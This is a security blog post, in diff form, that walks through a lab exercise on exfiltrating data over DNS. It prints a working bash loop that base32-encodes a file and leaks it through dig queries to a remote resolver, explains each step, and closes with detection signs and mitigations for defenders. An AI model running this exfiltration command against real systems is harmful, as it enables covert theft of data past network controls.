@@ -1,0 +1,357 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Data Exfiltration by Abusing DNS | zerrox&#39; security blog</title>
+  <meta name="author" content="zerrox9">
+  
+  <meta name="description" content="A short showcase of how DNS can be abused as a data exfiltration channel.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Data Exfiltration by Abusing DNS"/>
+  <meta property="og:site_name" content="zerrox&#39; security blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/project/atom.xml" title="zerrox&#39; security blog" type="application/atom+xml">
+  
+  
+    <link href="/project/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/project/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/project/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/project/">zerrox&#39; security blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/project/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Data Exfiltration by Abusing DNS</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> A short showcase of how DNS can be abused as a data exfiltration channel.
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="Data-Exfiltration-by-Abusing-DNS"><a href="#Data-Exfiltration-by-Abusing-DNS" class="headerlink" title="Data Exfiltration by Abusing DNS"></a>Data Exfiltration by Abusing DNS</h1><h3 id="This-was-BreachLab’s-Phantom-The-Heist"><a href="#This-was-BreachLab’s-Phantom-The-Heist" class="headerlink" title="This was BreachLab’s Phantom The Heist"></a>This was BreachLab’s <a target="_blank" rel="noopener" href="https://breachlab.org/">Phantom The Heist</a></h3><p>DNS is easy to overlook during a compromise. It is usually allowed out of a network, it is noisy by nature, and many environments focus harder on HTTP, SSH, or obvious file transfer tools. That makes it a useful channel for moving small amounts of data when a host can resolve external names.</p>
+<p>In this lab example, the target file was:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/vault/classified.db</span><br></pre></td></tr></table></figure>
+
+<p>The exfiltration command was:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">i=0</span><br><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db | <span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span> | <span class="built_in">fold</span> -w32 | <span class="keyword">while</span> <span class="built_in">read</span> -r chunk; <span class="keyword">do</span></span><br><span class="line">    dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br><span class="line">    i=$((i+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="How-It-Worked"><a href="#How-It-Worked" class="headerlink" title="How It Worked"></a>How It Worked</h2><p>The important trick is that DNS names can carry attacker-controlled text. Instead of sending the file directly over HTTP or copying it with <code>scp</code>, the file is encoded and placed into DNS query labels.</p>
+<p>This part reads the file and converts it to DNS-safe text:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base32</span> -w0 /opt/vault/classified.db</span><br></pre></td></tr></table></figure>
+
+<p>Raw database bytes cannot be safely placed into a domain name. Base32 converts the file into letters and numbers. The <code>-w0</code> option keeps the output on one line, which makes it easier to split into fixed-size chunks afterwards.</p>
+<p>Then the output is cleaned up:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tr</span> -d <span class="string">&#x27;=&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27;A-Z&#x27;</span> <span class="string">&#x27;a-z&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>Base32 padding uses <code>=</code> characters, but <code>=</code> is not valid inside a normal DNS label. Removing the padding makes the encoded text fit better into domain labels. Lowercasing the output is not strictly required, but it keeps the generated queries consistent.</p>
+<p>Next, the encoded stream is split into small labels:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">fold</span> -w32</span><br></pre></td></tr></table></figure>
+
+<p>DNS has size limits. A single label can be up to 63 characters, and the full domain name can be up to 253 characters. Using 32-character chunks keeps each query comfortably inside those limits.</p>
+<p>Finally, each chunk is placed into a DNS lookup:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig @10.13.37.30 <span class="string">&quot;<span class="variable">$&#123;chunk&#125;</span>.<span class="variable">$&#123;i&#125;</span>.123.exfil.local&quot;</span> A</span><br></pre></td></tr></table></figure>
+
+<p>Each query asks the DNS server at <code>10.13.37.30</code> for an <code>A</code> record. The requested hostname contains:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;encoded-data&gt;.&lt;sequence-number&gt;.123.exfil.local</span><br></pre></td></tr></table></figure>
+
+<p>The sequence number matters because DNS queries can arrive out of order or be retried. On the receiving side, the DNS server logs the queried names. The data can then be reconstructed by sorting the chunks by their sequence number, joining the Base32 text, restoring padding if needed, and decoding it back into the original file.</p>
+<p>The DNS response itself is not important here. The useful part is the question being asked.</p>
+<h2 id="Why-DNS-Is-Useful-for-Abuse"><a href="#Why-DNS-Is-Useful-for-Abuse" class="headerlink" title="Why DNS Is Useful for Abuse"></a>Why DNS Is Useful for Abuse</h2><p>DNS is a good abuse channel because it often has a path out of restricted networks. Even when direct internet access is blocked, systems still need name resolution to reach package mirrors, update servers, internal services, SaaS applications, and authentication providers.</p>
+<p>It also blends into normal traffic better than many obvious exfiltration methods. A host making DNS queries is expected behavior. Security tools may alert on suspicious domains or high query volume, but quiet, low-rate DNS traffic can be easier to miss than a new outbound TCP connection to an unfamiliar service.</p>
+<p>Another advantage is that DNS works through delegation. If an attacker controls a domain such as:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exfil.example</span><br></pre></td></tr></table></figure>
+
+<p>they can configure authoritative nameservers for it. Any lookup for a random subdomain under that zone, such as:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">datachunk.42.exfil.example</span><br></pre></td></tr></table></figure>
+
+<p>eventually reaches infrastructure they control. That means the data can be captured just by observing DNS requests for the delegated zone.</p>
+<p>DNS is not good for large files. It is slow, size-limited, and noisy when too much data is moved. But for small secrets, tokens, keys, hostnames, command output, or database snippets, it can be enough.</p>
+<h2 id="What-to-Look-For"><a href="#What-to-Look-For" class="headerlink" title="What to Look For"></a>What to Look For</h2><p>Defenders can detect this technique by looking for DNS behavior that does not resemble normal browsing or service discovery:</p>
+<ul>
+<li>Long or high-entropy subdomains</li>
+<li>Many unique subdomains under the same parent domain</li>
+<li>Sequential labels such as <code>0</code>, <code>1</code>, <code>2</code>, <code>3</code></li>
+<li>Repeated queries to unusual internal or external resolvers</li>
+<li>DNS requests containing encoded-looking text</li>
+<li>Large spikes in <code>NXDOMAIN</code> responses</li>
+</ul>
+<p>The example query structure is especially suspicious:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;base32 chunk&gt;.&lt;counter&gt;.&lt;identifier&gt;.exfil.local</span><br></pre></td></tr></table></figure>
+
+<p>A normal application usually does not generate hundreds of unique, random-looking hostnames with numeric counters.</p>
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>The strongest control is to force clients to use approved recursive resolvers and block direct DNS to arbitrary servers. In this example, the command explicitly queries:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.13.37.30</span><br></pre></td></tr></table></figure>
+
+<p>If hosts are only allowed to talk to trusted DNS resolvers, direct exfiltration to an attacker-controlled resolver becomes harder.</p>
+<p>Useful mitigations include:</p>
+<ul>
+<li>Block outbound DNS except from approved resolvers</li>
+<li>Log DNS queries centrally</li>
+<li>Alert on long, random, or high-volume subdomains</li>
+<li>Monitor for newly seen domains and unusual TLDs</li>
+<li>Limit which systems can resolve external names</li>
+<li>Inspect DNS-over-HTTPS and DNS-over-TLS policy gaps</li>
+</ul>
+<p>DNS is necessary, so it cannot simply be turned off. The goal is to make DNS boring and predictable: known clients, known resolvers, logged queries, and alerts when hosts start using it like a transport protocol.</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/project/2026/07/16/2026-07-16-reversing/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/project/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/project/2026/06/27/2026-06-27-abusing-system-services/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2026-07-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/project/categories/security/">security<span>2</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/project/tags/security/">security<span>2</span></a></li> <li><a href="/project/tags/dns/">dns<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 zerrox9's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/project/js/jquery.imagesloaded.min.js"></script>
+<script src="/project/js/gallery.js"></script>
+<script src="/project/js/bootstrap.min.js"></script>
+<script src="/project/js/main.js"></script>
+<script src="/project/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/project/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
